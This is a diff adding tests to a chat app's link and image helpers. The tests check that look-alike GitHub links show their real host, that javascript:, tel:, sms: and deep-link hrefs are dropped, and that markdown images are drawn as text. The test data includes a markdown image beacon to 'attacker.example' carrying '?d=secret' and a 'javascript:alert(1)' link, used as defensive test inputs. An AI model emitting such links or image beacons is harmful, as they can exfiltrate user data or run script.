@@ -19,6 +19,9 @@ import {
   kinChatScreenState,
   kinChatStatusLine,
   kinDayLabel,
+  kinImageSource,
+  kinImageText,
+  kinLinkToOpen,
   kinEarlierPage,
   kinMessageLabel,
   kinMessageLinks,
@@ -425,6 +428,77 @@ describe("message labels", () => {
       { label: "https://a.b/c", href: "https://a.b/c" },
     ]);
     expect(kinMessageLinks("No links here.")).toEqual([]);
+  });
+
+  it.each([
+    ["keeps GitHub link text", "[PR 212](https://github.com/o/r/pull/212)", "PR 212"],
+    ["names a host other than GitHub", "[the docs](https://t3.codes/docs)", "the docs · t3.codes"],
+    [
+      "keeps text that shows the real host",
+      "[t3.codes/docs](https://t3.codes/docs)",
+      "t3.codes/docs",
+    ],
+    [
+      "names the real host behind a look-alike",
+      "[github.com/o/r](https://github.com.evil.example/o/r)",
+      "github.com/o/r · github.com.evil.example",
+    ],
+    [
+      "names the real host when GitHub text points elsewhere",
+      "[github.com/o/r/pull/1](https://evil.example/pull/1)",
+      "github.com/o/r/pull/1 · evil.example",
+    ],
+    [
+      "names GitHub when the text names another host",
+      "[t3.codes](https://github.com/o/r)",
+      "t3.codes · github.com",
+    ],
+  ])("labels a link's action: %s", (_name, body, label) => {
+    expect(kinMessageLinks(body).map((link) => link.label)).toEqual([label]);
+  });
+
+  it.each([
+    ["a phone number", "[Call me](tel:+15551234)"],
+    ["a text message", "[Text me](sms:+15551234)"],
+    ["a T3 deep link", "[Open](t3code://threads/1)"],
+    ["a script", "[Run](javascript:alert(1))"],
+    ["a relative path", "[Notes](/notes/today)"],
+    ["an image", "![pixel](https://attacker.example/p.png?d=secret)"],
+  ])("offers no action for %s", (_name, body) => {
+    expect(kinMessageLinks(body)).toEqual([]);
+  });
+});
+
+describe("kinLinkToOpen", () => {
+  it.each([
+    ["https://github.com/o/r/pull/212", "https://github.com/o/r/pull/212"],
+    ["http://localhost:3773/docs", "http://localhost:3773/docs"],
+    ["tel:+15551234", null],
+    ["sms:+15551234", null],
+    ["t3code://threads/1", null],
+    ["javascript:alert(1)", null],
+    ["mailto:a@b.example", null],
+    ["/notes/today", null],
+    ["not a url", null],
+  ])("%s", (href, opens) => {
+    expect(kinLinkToOpen(href)).toBe(opens);
+  });
+});
+
+describe("message images", () => {
+  // `![](…?d=<data>)` in an agent's message would leak data if the chat fetched it on open.
+  const image = { href: "https://attacker.example/p.png?d=secret", alt: "status", title: null };
+
+  it("resolves no source, so the renderer requests nothing", () => {
+    expect(kinImageSource()).toEqual({ uri: "" });
+  });
+
+  it.each([
+    ["names its alt text", image, "Image: status"],
+    ["falls back without alt text", { ...image, alt: null }, "Image"],
+    ["ignores blank alt text", { ...image, alt: "  " }, "Image"],
+  ])("draws a block image as text: %s", (_name, request, text) => {
+    expect(kinImageText(request)).toBe(text);
   });
 });
 
